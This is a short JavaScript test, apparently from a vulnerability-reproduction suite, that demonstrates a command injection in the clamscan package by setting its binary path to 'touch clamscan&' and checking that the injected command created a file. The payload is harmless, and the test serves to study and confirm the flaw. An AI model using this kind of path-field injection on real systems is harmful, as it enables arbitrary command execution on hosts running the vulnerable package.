//https://snyk.io/vuln/SNYK-JS-CLAMSCAN-564113
test("Command Injection in clamscan", () => 
{
	const Root = require("clamscan");
	const fs = require('fs');
	const path = './clamscan';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	var attack_code = "touch clamscan";
	var root = new Root();
	let run = root.init({"clamscan": {'path': attack_code + "&"}});

	run.then(() => {
		
		sleep.sleep(5);
		//checking that its created by after exploit.
		file_exist = fs.existsSync(path);
		expect(file_exist).toBe(true);

		fs.unlink(path, function(err) {});//deleting the file after creation

	});
	
});